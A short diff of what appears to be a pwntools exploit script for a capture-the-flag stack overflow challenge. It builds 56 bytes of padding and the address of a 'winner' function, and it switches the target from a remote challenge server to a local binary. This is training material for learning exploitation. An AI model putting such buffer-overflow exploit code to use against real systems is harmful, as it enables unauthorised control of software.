@@ -13,8 +13,8 @@ winner_address = p64(elf.symbols.winner)
 padding_length = 56
 
 log.info('Create IO')
-io = remote('139.59.176.147', 31006)
-#io = process('/home/kali/Downloads/reg')
+#io = remote('139.59.176.147', 31006)
+io = process('/home/kali/Downloads/reg')
 
 
 padding = b'A' * padding_length
